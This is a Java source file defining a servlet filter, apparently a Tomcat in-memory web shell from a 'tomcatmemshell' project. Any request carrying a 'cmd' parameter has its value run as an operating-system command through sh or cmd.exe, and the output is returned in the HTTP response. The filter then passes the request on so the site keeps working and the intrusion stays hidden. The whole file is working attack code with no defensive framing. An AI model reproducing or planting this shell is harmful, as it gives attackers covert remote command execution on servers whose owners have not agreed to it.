package com.tomcatmemshell.filter;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class FilterShell implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if (servletRequest.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", servletRequest.getParameter("cmd")} : new String[]{"cmd.exe", "/c", servletRequest.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
        }

        // 不影响程序可用性
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
